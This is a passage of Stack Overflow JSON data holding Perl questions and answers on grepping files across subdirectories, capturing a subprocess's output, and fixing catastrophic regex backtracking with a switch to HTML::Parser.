going to use Perl, work through a book.  The &quot;<i>Learning Perl</i>&quot; used to be a classic, perfect one -- excellent, short and to the point, and brings you up to speed quickly.  I don&#39;t know new editions but I can imagine that it is still just as great."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "edited": false, "score": 0, "creation_date": 1463007505, "post_id": 37171703, "comment_id": 61883852, "body": "@AvaXue  As for regex, I forgot the first one, <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">perlretut</a>.  Then there is the one I quoted already, <a href=\"http://perldoc.perl.org/perlrequick.html\" rel=\"nofollow noreferrer\">perlrequick</a>, and then there would be a good book, for that and else.  Have fun :)"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1462995551, "last_edit_date": 1462995551, "creation_date": 1462994899, "answer_id": 37171703, "question_id": 37168126, "link": "https://stackoverflow.com/questions/37168126/recursive-subdirectory-grep/37171703#37171703", "title": "Recursive subdirectory grep", "body": "<p>The posted code seems to greatly over-comlicate the matters, given the clarifications. </p>\n\n<p>The code below takes a subdirectory name from the <code>$cluster</code> file iterated over by <code>&lt;$in&gt;</code>, then it builds the file name using <code>$dir</code> and it.  Lines in the file are then iterated over to find the one with the pattern. Once that happens we print results and move on to the next file (in the next subdirectory).  </p>\n\n<p>Note that we don't really need <code>@result</code> unless more processing happens later.</p>\n\n<pre><code># Iterate over subdirectories that each have the file\nwhile ( $c1 = &lt;$in&gt; ) {\n    chomp $c1;\n\n    # Build the full file name in this subdirectory, open the file\n    my $filename = \"$dir/$c1/pairsAngles.txt\";\n    open my $fh_in, $filename  or die \"$!\";\n\n    # Iterate over lines in the file to find the pattern\n    while ( my $line = &lt;$fh_in&gt; ) { \n        if ( $line =~ m/Distance:/ ) { \n            # Found our result, print output\n            chomp($line);\n            $csv-&gt;say($out, [$c1, $line]);\n            push @result, $line;\n            # No need to continue if we know there is exactly one\n            last; \n        }   \n    }   \n}\n# Do something else with @result if needed ...\n</code></pre>\n"}], "owner": {"reputation": 145, "user_id": 6260200, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-hrIHpEMquqY/AAAAAAAAAAI/AAAAAAAABPQ/LywDxTltk2I/photo.jpg?sz=128", "display_name": "Ava Xue", "link": "https://stackoverflow.com/users/6260200/ava-xue"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 296, "favorite_count": 0, "accepted_answer_id": 37171703, "answer_count": 2, "score": 1, "last_activity_date": 1462996841, "creation_date": 1462983337, "last_edit_date": 1462996841, "question_id": 37168126, "link": "https://stackoverflow.com/questions/37168126/recursive-subdirectory-grep", "title": "Recursive subdirectory grep", "body": "<p>Sorry for being a pain.</p>\n\n<p>I'm trying to grep the string <code>Distance:</code> from each <code>pairsAngles.txt</code> file within over 2,000 subdirectories; the names of the subdirectories are obtained from a CSV file.</p>\n\n<p>Each subdirectory contains one <code>pairsAngles.txt</code>, within which there is only one line that contains <code>Distance:</code>. However, my current <code>foreach</code> and <code>while</code> loops give me eight <code>Distance</code> values for each subdirectory.</p>\n\n<p>In addition, each subsequent subdirectory gets all the distances from the previous subdirectories.</p>\n\n<p>Like this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/0PZiH.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/0PZiH.png\" alt=\"enter image description here\"></a> </p>\n\n<p>A text version of the picture (row #4, column #2 has 4*8 = 32 entries of Distance)</p>\n\n<p>All the <code>pairsAngles.txt</code> files are in subdirectories, and each subdirectory has a unique name.</p>\n\n<p>I first read all the subdirectory names from the CSV file and split them into an array, then retrieve every element from that array to get into a subdirectory so that I can grep.</p>\n\n<p><code>clst1.csv</code> has only one column, which is the subfolder names:</p>\n\n<pre><code>oligomerAngle-1h2s-000_001-0003_0025_A-0034_0056_A-B004A012\noligomerAngle-5ax0-000_001-0010_0036_A-0042_0064_A-B004A013\noligomerAngle-4qnd-004_005-0046_0065_A-0069_0091_A-A004B006\noligomerAngle-2j8c-003_004-0171_0196_L-0226_0250_L-B011A001\n</code></pre>\n\n<pre class=\"lang-none prettyprint-override\"><code>oligomerAngle-2j8c-003_004-0171_0196_L-0226_0250_L-B011A001\n\nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675 \nDistance: 7.98675\nDistance: 7.95099 \nDistance: 7.95099 \nDistance: 7.95099 \nDistance: 7.95099 \nDistance: 7.95099 \nDistance: 7.95099 \nDistance: 7.95099\nDistance: 7.95099\nDistance: 7.87554 \nDistance: 7.87554 \nDistance: 7.87554 \nDistance: 7.87554 \nDistance: 7.87554 \nDistance: 7.87554\nDistance: 7.87554 \nDistance: 7.87554 \nDistance: 7.69417 \nDistance: 7.69417 \nDistance: 7.69417 \nDistance: 7.69417 \nDistance: 7.69417\nDistance: 7.69417 \nDistance: 7.69417 \nDistance: 7.69417\n</code></pre>\n\n<p>But the actual value should just be \"Distance: 7.69417\"\nNot sure what went wrong. Here's the code: </p>\n\n<pre class=\"lang-none prettyprint-override\"><code>use File::Find;\nuse Text::CSV_XS;\n\nmy @pairs  = ();\nmy @result = ();\nmy $in;\nmy $out;\nmy $c1;\nmy $dist = \"\";\nmy $dir  = \"/home/oligomerAngle\";\n\nmy $cluster = \"clst1.csv\";\nopen( $in, $cluster ) || die \"cannot open \\\"$cluster\\\": $!\";\n\nmy $cU = \"clst1Updated.csv\";\nopen( $out, \"&gt;$cU\" ) || die \"cannot open '$cU' $!\";\n\nmy $csv = Text::CSV_XS-&gt;new( { binary =&gt; 1, auto_diag =&gt; 1, eol =&gt; $/ } );\n\nwhile ( $c1 = &lt;$in&gt; ) {\n    chomp $c1;\n    @pairs = split( ' ', $c1 );\n\n    foreach my $pair (@pairs) {\n\n        find( \\&amp;Matches, \"$dir/$c1\" );\n\n        sub Matches {\n            open( my $subdir, \"pairsAngles.txt\" ) or die \"$!\";\n\n            while ( $dist = &lt;$subdir&gt; ) {\n\n                if ( $dist =~ m/Distance:/ ) {\n                    push( @result, \"$dist\" );\n                }\n            }\n        }\n\n        chdir \"..\";\n        $csv-&gt;say( $out, [ \"@pairs\", \"@result\" ] );\n    }\n}\n\nif ( not $csv-&gt;eof ) {\n    $csv-&gt;error_diag();\n}\n\nclose $out or die \"$!\";\n</code></pre>\n"}, {"tags": ["python", "perl", "popen3"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1462977056, "post_id": 37165526, "comment_id": 61866814, "body": "There are several ways to read output from an external process in Perl, but the simplest are <a href=\"http://perldoc.perl.org/perlop.html#qx%2f_STRING_%2f\" rel=\"nofollow noreferrer\"><code>qx()</code></a>, <a href=\"http://perldoc.perl.org/perlipc.html#Using-open%28%29-for-IPC\" rel=\"nofollow noreferrer\">piped <code>open</code></a>, and <a href=\"https://metacpan.org/pod/Capture::Tiny\" rel=\"nofollow noreferrer\">Capture::Tiny</a>. For <code>qx</code> and <code>open</code> you&#39;ll have to redirect STDERR since you want to check both STDOUT and STDERR."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1462977126, "post_id": 37165526, "comment_id": 61866873, "body": "<code>open3</code>+<code>select</code> is too low level. Use IPC::Run3&#39;s <code>run3</code> or IPC::Run&#39;s <code>run</code>."}, {"owner": {"reputation": 550, "user_id": 2915499, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whqGg.jpg?s=128&g=1", "display_name": "Azade Farshad", "link": "https://stackoverflow.com/users/2915499/azade-farshad"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462977821, "post_id": 37165526, "comment_id": 61867417, "body": "@ikegami Should I use something like this to wait for the output? <code>$pid = run3</code> or <code>$pid =open3</code> <code>wait($pid,0)</code>"}], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": true, "score": 3, "last_activity_date": 1462992003, "last_edit_date": 1495539847, "creation_date": 1462990686, "answer_id": 37170475, "question_id": 37165526, "link": "https://stackoverflow.com/questions/37165526/python-code-to-perl/37170475#37170475", "title": "Python code to Perl", "body": "<p>The answer depends on if it is important to print the message <code>\"rescheduling was successful!\"</code>  immediately after a the line was printed from <code>bmod</code> (when <code>bmod</code> is still running) or if it is sufficient to print the line after <code>bmod</code> has exited.</p>\n\n<p>The last case is a very simple to achieve in Perl, for example:</p>\n\n<pre><code>my $out = qx/bmod -b $beginTime $job_id 2&gt;&amp;1/;\nsay \"rescheduling was successful!\" if $out =~ /changed/;\n</code></pre>\n\n<p>Regarding the first case, if you need to print the message immediately (even before <code>bmod</code> has exited), first note that your Python script is probably not working correctly. The lines <code>p.stderr.readline()</code> will block the script until a line is ready to be read from <code>p.stderr</code>, similarly <code>p.stdout.readline()</code> will block the script until a line is ready to be read from <code>p.stdout</code>. So if <code>bmod</code> only prints to <code>stdout</code> and nothing goes to <code>stderr</code>, the script will hang at the first call to <code>p.stderr.readline()</code> and only return when <code>bmod</code> exits.</p>\n\n<p>I am not sure how to do this correctly in Python, but in Perl you can use <a href=\"https://metacpan.org/pod/IPC::Open3\" rel=\"nofollow noreferrer\"><code>IPC::Open3</code></a> combined with <a href=\"https://metacpan.org/pod/IO::Select\" rel=\"nofollow noreferrer\"><code>IO::Select</code></a>. See for example: <a href=\"https://stackoverflow.com/questions/25581407/perl-select-return-bad-file-descriptor-error\">Perl select return \u201cbad file descriptor\u201d error</a></p>\n\n<p>Also note: A simpler solution in Perl can be achived using <a href=\"http://perldoc.perl.org/functions/open.html\" rel=\"nofollow noreferrer\"><code>open</code></a> if <code>stderr</code> and <code>stdout</code> are merged:</p>\n\n<pre><code>my $pid = open ( my $fh, '-|', \"bmod -b $beginTime $job_id 2&gt;&amp;1\" ) or die \"Could not run command: $!\";\nwhile ( my $line = &lt;$fh&gt; ) {\n     print $line if $line =~ /changed/;\n}\nclose $fh;\n</code></pre>\n"}], "owner": {"reputation": 550, "user_id": 2915499, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whqGg.jpg?s=128&g=1", "display_name": "Azade Farshad", "link": "https://stackoverflow.com/users/2915499/azade-farshad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 153, "favorite_count": 0, "accepted_answer_id": 37170475, "answer_count": 1, "score": 0, "last_activity_date": 1462992003, "creation_date": 1462976554, "question_id": 37165526, "link": "https://stackoverflow.com/questions/37165526/python-code-to-perl", "title": "Python code to Perl", "body": "<p>I have a piece of python code, that I need to convert it to perl, but unfortunately I am not good in perl, so sorry if the question is simple.\nI would like to check STDOUT and STDERR for a specific word. Here is the python code:</p>\n\n<pre><code>p = subprocess.Popen(\"bmod -b \" + beginTime + \" \" + job_id + \"; exit 1;\", \nstdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n\nwhile p.poll() is None:\n    err = p.stderr.readline().decode('utf_8')\n    out = p.stdout.readline().decode('utf_8')\n    if \"changed\" in err or \"changed\" in out:\n        subprocess.Popen(\"echo rescheduling was successful!\", shell=True)\nos._exit(0)\n</code></pre>\n\n<p>I read some documentations and open3 function may work here, but for p.poll() part I am not sure what to use.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462977327, "post_id": 37165499, "comment_id": 61867024, "body": "Ugh. Don&#39;t use regex to parse a tagged language (like HTML). It&#39;s filthy. For that matter, fetching your data with <code>curl</code> rather than <code>LWP</code> is kinda redundant too."}, {"owner": {"reputation": 14766, "user_id": 483486, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/fcf225aa724d9bb05f6693dc8cf8c459?s=128&d=identicon&r=PG", "display_name": "OmnipotentEntity", "link": "https://stackoverflow.com/users/483486/omnipotententity"}, "edited": false, "score": 0, "creation_date": 1462977512, "post_id": 37165499, "comment_id": 61867170, "body": "There are two possibilities: A likely cause is the &lt;head&gt; tag in that page is titanic.  And also because you have two non-greedy searches you have a regex that might need to jump back and try again a lot.  Another likely cause is this page contains &lt;header&gt; tags, which match the first part of the regex, and can cause the same jump back and try again ad nausium behavior."}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462977512, "post_id": 37165499, "comment_id": 61867171, "body": "@Sobrique - this is from a Perl module (HTML::Miner). Do you have a better suggestion for extracting the meta tags, and images from a HTML source?"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 2, "creation_date": 1462977643, "post_id": 37165499, "comment_id": 61867267, "body": "<a href=\"http://stackoverflow.com/a/1732454/5830574\">stackoverflow.com/a/1732454/5830574</a> (sorry, couldn&#39;t resist...)"}, {"owner": {"reputation": 14766, "user_id": 483486, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/fcf225aa724d9bb05f6693dc8cf8c459?s=128&d=identicon&r=PG", "display_name": "OmnipotentEntity", "link": "https://stackoverflow.com/users/483486/omnipotententity"}, "edited": false, "score": 1, "creation_date": 1462977649, "post_id": 37165499, "comment_id": 61867274, "body": "Andrew, look into HTML::Parser <a href=\"http://www.foo.be/docs/tpj/issues/vol5_1/tpj0501-0003.html\" rel=\"nofollow noreferrer\">foo.be/docs/tpj/issues/vol5_1/tpj0501-0003.html</a>"}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "reply_to_user": {"reputation": 14766, "user_id": 483486, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/fcf225aa724d9bb05f6693dc8cf8c459?s=128&d=identicon&r=PG", "display_name": "OmnipotentEntity", "link": "https://stackoverflow.com/users/483486/omnipotententity"}, "edited": false, "score": 0, "creation_date": 1462977950, "post_id": 37165499, "comment_id": 61867513, "body": "@OmnipotentEntity - thanks, will check that out :)"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462981156, "post_id": 37165499, "comment_id": 61869827, "body": "Yes. use a parser. That&#39;s what they&#39;re for. HTML is contextual. Regular expression are not. They can never work fully, and every time you try, you create some brittle code that may mysteriously break, because the assumptions you made are no longer valid."}, {"owner": {"reputation": 658, "user_id": 5543203, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/bdYF4.png?s=128&g=1", "display_name": "Henrik supports the community", "link": "https://stackoverflow.com/users/5543203/henrik-supports-the-community"}, "edited": false, "score": 0, "creation_date": 1462982757, "post_id": 37165499, "comment_id": 61870951, "body": "I second the recommandation to just use a parser, and HTML::Parser (<a href=\"https://metacpan.org/pod/HTML::Parser\" rel=\"nofollow noreferrer\">metacpan.org/pod/HTML::Parser</a>) works for me."}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "reply_to_user": {"reputation": 658, "user_id": 5543203, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/bdYF4.png?s=128&g=1", "display_name": "Henrik supports the community", "link": "https://stackoverflow.com/users/5543203/henrik-supports-the-community"}, "edited": false, "score": 0, "creation_date": 1462983057, "post_id": 37165499, "comment_id": 61871147, "body": "@Henrik - already done it using HTML::Parser :) (didn&#39;t take as long as I was expecting, and kinda wishing I&#39;d just done it, before I spent the time trying to debug this module!)"}], "answers": [{"comments": [{"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 0, "creation_date": 1462977774, "post_id": 37165965, "comment_id": 61867376, "body": "thanks, that did the trick :) What is the \\b doing? I thought that was for a boundary? And yes, its not an ideal bit of coding - but its what I have to work with on the perl module we are using :) Thanks!"}, {"owner": {"reputation": 14766, "user_id": 483486, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/fcf225aa724d9bb05f6693dc8cf8c459?s=128&d=identicon&r=PG", "display_name": "OmnipotentEntity", "link": "https://stackoverflow.com/users/483486/omnipotententity"}, "edited": false, "score": 0, "creation_date": 1462977847, "post_id": 37165965, "comment_id": 61867440, "body": "\\b means word boundary.  Meaning that after the d can&#39;t be another letter.  It prevents &lt;header&gt; from matching."}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 0, "creation_date": 1462978020, "post_id": 37165965, "comment_id": 61867562, "body": "aaaah very clever! Would never had thought of that :) Going to have a play with HTML::Parser now as well... just to see if I can get a cleaner solution going. I&#39;ll still upvote this though when it lets me :)"}], "tags": [], "owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "is_accepted": true, "score": 4, "last_activity_date": 1462977575, "creation_date": 1462977575, "answer_id": 37165965, "question_id": 37165499, "link": "https://stackoverflow.com/questions/37165499/perl-regex-seems-to-get-into-infinite-loop/37165965#37165965", "title": "Perl regex seems to get into infinite loop", "body": "<p>It isn't an inifinite loop, it is just slow.  It is finding <code>&lt;header&gt;</code> tags too, and for each one it has to go through the rest of the file looking for an ending <code>&lt;/head&gt;</code> tag (which isn't there).  Change it to:</p>\n\n<pre><code>`m/&lt;head\\b.*?&gt;(.*?)&lt;\\/head&gt;/gis`\n</code></pre>\n\n<p>The problem seems exacerbated by treating the non-utf8 file as utf8.</p>\n"}, {"comments": [{"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 0, "creation_date": 1462979037, "post_id": 37166124, "comment_id": 61868282, "body": "Thanks for taking the time to explain it. I&#39;ve already fixed it with the help of ysth - but I&#39;ve upvoted you as well. I&#39;m actually having a play with HTML::Parser now, as that seems a much quicker and cleaner method of doing this. I was just being lazy and using a pre-existing Perl module - but it seems like its a very poor option :("}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 1, "creation_date": 1462980105, "post_id": 37166124, "comment_id": 61869109, "body": "@AndrewNewby: <code>HTML::Parser</code> is really a base class for building more convenient modules. I suggest that you look at <a href=\"https://metacpan.org/pod/HTML::TreeBuilder\" rel=\"nofollow noreferrer\">HTML::TreeBuilder</a> which is built on <code>HTML::Parser</code> but uses it to build a Perl data structure that you can navigate and modify at will"}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 0, "creation_date": 1462980496, "post_id": 37166124, "comment_id": 61869380, "body": "thanks... but I&#39;ve almost finished it with HTML::Parser. Just the time it takes to get used to its structure, etc"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 4, "last_activity_date": 1462978012, "creation_date": 1462978012, "answer_id": 37166124, "question_id": 37165499, "link": "https://stackoverflow.com/questions/37165499/perl-regex-seems-to-get-into-infinite-loop/37166124#37166124", "title": "Perl regex seems to get into infinite loop", "body": "<p>You have found an instance of <em>catastrophic backtracking</em> (q.v.)</p>\n\n<p>Even for those sites for which your regex pattern works, the matching will be very lengthy and CPU-intensive. You should avoid the <code>.*?</code> where possible and use a negated character class instead</p>\n\n<p>If you use this, all should be well</p>\n\n<pre><code>$html =~ m| &lt;head\\b[^&lt;&gt;]*&gt; (.*) &lt;/head&gt; |gisx\n</code></pre>\n\n<p><code>&lt;head.*?&gt;</code> is supposed to match just one HTML tag, but there is nothing to prevent the regex engine from searching right to the end of the file. Changing this to <code>&lt;head[^&lt;&gt;]*&gt;</code> will only allow it to match non-angle-brackets after <code>head</code>, which will be only a few characters if any</p>\n\n<p>The captured expression is less simple as you presumably want to match tags contained within the <code>&lt;head&gt;</code> element so the negated character class won't work. However, catastrophic backtracking is almost always the result of multiple wildcards acting simultaneously, so every possible match from one wildcard must be matched with every possible match from another, resulting in exponential complexity. With just one wildcard left the regex should work fine</p>\n\n<p>Note also that I have used an alternative delimiter for the regex so that the slash doesn't need to be escaped, and I have added a word boundary <code>\\b</code> after <code>&lt;head</code> to prevent it from matching <code>&lt;header</code> or similar</p>\n"}], "owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 37165965, "answer_count": 2, "score": 0, "last_activity_date": 1463041931, "creation_date": 1462976491, "last_edit_date": 1463041931, "question_id": 37165499, "link": "https://stackoverflow.com/questions/37165499/perl-regex-seems-to-get-into-infinite-loop", "title": "Perl regex seems to get into infinite loop", "body": "<p>I'm trying to figure out why this code won't run on some sites. Here is a <strong>working</strong> version:</p>\n\n<pre><code>my $url = \"http://www.bbc.co.uk/news/uk-36263685\";\n\n`curl -L '$url' &gt; ./foo.txt`;\n\nmy $html;\nopen (READPAGE,\"&lt;:encoding(UTF-8)\",\"./foo.txt\");\n    $html = join \"\\n\", &lt;READPAGE&gt;;\nclose(READPAGE);\n\n# works ok with the BBC page, and almost all others\nmy $head;\nwhile( $html =~ m/&lt;head.*?&gt;(.*?)&lt;\\/head&gt;/gis ) {\n   print qq|FOO: got header...\\n|;\n}\n</code></pre>\n\n<p>..and then this <strong>broken</strong> version , just seems to lock up: (exactly the same code - just a different URL)</p>\n\n<pre><code>my $url = \"http://www.sport.pl/euro2016/1,136510,20049098,euro-2016-polsat-odkryl-karty-24-mecze-w-kanalach-otwartych.html\";\n\n`curl -L '$url' &gt; ./foo.txt`;\n\nmy $html;\nopen (READPAGE,\"&lt;:encoding(UTF-8)\",\"./foo.txt\");\n    $html = join \"\\n\", &lt;READPAGE&gt;;\nclose(READPAGE);\n\n# Locks up with this regex. Just seems to be some pages it does it on\nmy $head;\nwhile( $html =~ m/&lt;head.*?&gt;(.*?)&lt;\\/head&gt;/gis ) {\n   print qq|FOO: got header...\\n|;\n}\n</code></pre>\n\n<p>I can't work out whats going on with it. Any ideas? </p>\n\n<p>Thanks!</p>\n\n<p>UPDATE: For anyone interested, I ended up moving away from the Perl module I was using to extract the info, and went for a more robust HTML::Parser method. Here is the module, if anyone wants to use it as a base:</p>\n\n<pre><code> package MetaExtractor;\n use base \"HTML::Parser\";\n use Data::Dumper;\n\n sub start {\n     my ($self, $tag, $attr, $attrseq, $origtext) = @_;\n\n     if ($tag eq \"img\") {\n         #print Dumper($tag,$attr);\n\n         if ($attr-&gt;{src} =~ /\\.(jpe?g|png)/i) {\n            $attr-&gt;{src} =~ s|^//|http://|i; # fix urls like //foo.com\n            push @{$Links::COMMON-&gt;{images}}, $attr-&gt;{src};\n         }\n     }\n\n     if ($tag =~ /^meta$/i &amp;&amp;  $attr-&gt;{'name'} =~ /^description$/i) {\n         # set if we find &lt;META NAME=\"DESCRIPTION\"\n         $Links::COMMON-&gt;{META}-&gt;{description} = $attr-&gt;{'content'};\n     } elsif ($tag =~ /^title$/i &amp;&amp; !$Links::COMMON-&gt;{META}-&gt;{title}) {\n         $Links::COMMON-&gt;{META}-&gt;{title_flag} = 1;\n     } elsif ($tag =~ /^meta$/i &amp;&amp; $attr-&gt;{'property'} =~ /^og:description$/i) {\n         $Links::COMMON-&gt;{META}-&gt;{og_desc} = $attr-&gt;{content}\n     } elsif ($tag =~ /^meta$/i &amp;&amp; $attr-&gt;{'property'} =~ /^og:image$/i) {\n         $Links::COMMON-&gt;{META}-&gt;{og_image} = $attr-&gt;{content}\n     } elsif ($tag =~ /^meta$/i &amp;&amp; $attr-&gt;{'name'} =~ /^twitter:description$/i) {\n         $Links::COMMON-&gt;{META}-&gt;{tw_desc} = $attr-&gt;{content}\n     } elsif ($tag =~ /^meta$/i &amp;&amp; $attr-&gt;{'name'} =~ /^twitter:image:src$/i) {\n         $Links::COMMON-&gt;{META}-&gt;{tw_image} = $attr-&gt;{content}\n     }\n }\n\n sub text {\n     my ($self, $text) = @_;\n     # If we're in &lt;H1&gt;...&lt;/H1&gt; or  &lt;TITLE&gt;...&lt;/TITLE&gt;, save text\n     if ($Links::COMMON-&gt;{META}-&gt;{title_flag}) { $Links::COMMON-&gt;{META}-&gt;{title} .= $text; }\n }\n\n sub end {\n     my ($self, $tag, $origtext) = @_;\n\n     #print qq|END TAG: '$tag'\\n|;\n\n     # reset appropriate flag if we see &lt;/H1&gt; or &lt;/TITLE&gt;\n     if ($tag =~ /^title$/i) { $Links::COMMON-&gt;{META}-&gt;{title_flag} = 0; }\n }\n</code></pre>\n\n<p>It will extract:</p>\n\n<p>Title\nMeta description (not meta keywords, but its simple enough to use)\nFB Image\nFB Description\nTwitter Image\nTwitter Description\nAll the images found (it doesn't do anything to fancy with them... i.e pages that have relative URLs ... but I'm gonna have a play with that as time permits)</p>\n\n<p>Simply call with:</p>\n\n<pre><code>        my $html;\n        open (READPAGE,\"&lt;:encoding(UTF-8)\",\"/home/aycrca/public_html/cgi-bin/admin/tmp/$now.txt\");\n\n            my $p = new MetaExtractor;\n            while (&lt;READPAGE&gt;) {\n                $p-&gt;parse($_);\n            }\n            $p-&gt;eof;\n\n        close(READPAGE);\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": 